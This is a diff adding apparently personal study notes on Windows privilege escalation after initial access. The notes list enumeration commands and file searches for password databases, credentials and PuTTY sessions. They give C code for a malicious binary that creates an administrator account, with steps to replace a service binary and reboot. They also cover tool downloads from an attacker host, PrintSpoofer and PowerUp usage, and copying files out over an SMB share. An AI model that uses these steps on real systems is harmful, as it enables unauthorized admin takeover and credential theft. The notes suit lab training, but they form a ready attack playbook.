@@ -1,0 +1,214 @@
+** Windows PrivEsc **
+
+
+we should enumerate for the following after gaining initial access,
+
+Username and hostname:
+whoami
+
+
+Group membership of the current user:
+whoami /groups
+
+
+Exisiting users and groups:
+net-user
+Get-LocalUser
+
+net localgroup
+Get-LocalGroup
+
+view members of a group:
+Get-LocalGroupMember /<groupname>
+
+
+Operating system, version and architecture:
+systeminfo
+
+Network information:
+ipconfig /all
+
+routingtable:
+routeprint
+
+active connections:
+netstat -ano
+
+
+Installed Applications:
+
+for 32 bit applications:
+
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+for 64bit applications:
+
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+
+Running Processes:
+
+Get-Process
+
+
+Searching for password manager database files on the C:\ drive:
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+Searching for sensitive information in the XAMPP directory:
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+
+
+searching for text files and password manager databses in the home directory of a user:
+Get-ChildItem -Path C:\Users\divine\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+
+
+Using RunAs command to execute cmd as another user:
+runas /user:backupadmin cmd
+
+This can only be done in a GUI
+
+
+history of a powershell terminal:
+Get-History
+
+
+How to get the file that displays the hisotry of powershell:
+(Get-PSReadlineOption).HistorySavePath
+
+
+evil-winrm:
+evil-winrm -i <target ip> -u user -p “<password>”
+
+Using WinPEAS:
+
+serve it from a python server, 
+
+iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
+this will download winpeas, now all we have to do is run it
+
+it will automatically enumerate for the content described above and display information however auto eumeration is not always accurate and should be verified
+
+cached credentials for putty:
+reg query 
+"HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+List all Installed Windows Services:
+
+Get-Service
+Get-CimInstance
+Get-WmiObject
+
+To get the running services:
+
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+once a runningg service is identified that is user installed and the software developer is incharge of the directory structure as well as the permissions of the software
+
+review the permissions of the binary:
+
+icacls “<binary path>”
+
+
+| Mask | Permissions |
+| F | Full access |
+| M | Modify access |
+| RX | Read and execute access |
+| R | Read-only access |
+| W | Write-only access |
+
+
+
+We need Full access or Modify access to replace the binary in question
+For example
+
+
+lets create a code that will make a new user into a system and put that user in the administrator group
+
+code:
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+
+The cross compiled version of this code will serve as our malicous binary
+
+we will use mingw-64 to compile our code
+
+we will then trasnfer the cross compiled code to the remote machine
+using iwr to download the executable file
+
+after this we just move the binary to our home and then transfer over the malicous binary in its place
+
+
+
+
+in order to execute the binary we will restart the service
+
+how to check the startup type of the service binary in question
+
+
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'ApacheHTTPServer'}
+
+if it is auto, that would mean we can restart the service by rebooting the machine
+
+to check if the user can reboot the machine, we will check if the user has the SeShutDownPrivilege
+how do we do this?
+
+whoami /priv  this will list all the privileges of the current user
+
+in our case the current user does have this privelege meaning we reboot
+
+once we do that as our malicous binary instructed, a new user in the admin group would have been created
+
+
+Lets use Powerup.ps1
+
+on the target machine we will download this
+
+run it
+
+after powerup.ps1 which we run, we can simply use some commands in our favour like
+Get-ModifiableServiceFile
+
+This command will output binary files that can be modified by the current user
+
+Powerup also provides an AbuseFunction, which is a built in function to replace the binary and if we have a sufficient permissions, restart the service as well
+The default behavior is to create a new local user called john, with the password: Password123!
+
+view scheduled tasks:
+
+Get-ScheduledTasks
+schtasks /query
+
+we can replace the scheduled task with one of our own malicous binary if we have the necessary permissions
+
+
+
+we can also use exploits for priv esc
+
+if we have a SeImpersonatePrivilege on the current user we can use printspoofer to attempt elevating our privileges
+
+ we need to transfer over the printspoofer executable through iwr and then use the command to open up a powershell terminal with elevated privileges
+ 
+ .\printspoofer.exe -i -c powershell.exe
+  .\printspoofer.exe -i -c cmd.exe
+
+
+ transferring files from one machine to another with an smb share
+ 
+ impacket-smbserver -smb2support share . -username user -password password123
+ 
+ This command should be run on your kali machine (the machine you want to transfer files too, )
+ 
+ net use G: \\192.168.45.242\share /u:user password123
+ 
+ This command should be run on the machine you want to tranfers files from
+ 
+ from the machine we want to transfer files from we will just copy the files into the directory we mentioned (in the above command it is the G: directory) and we will get the files to the recieiving end
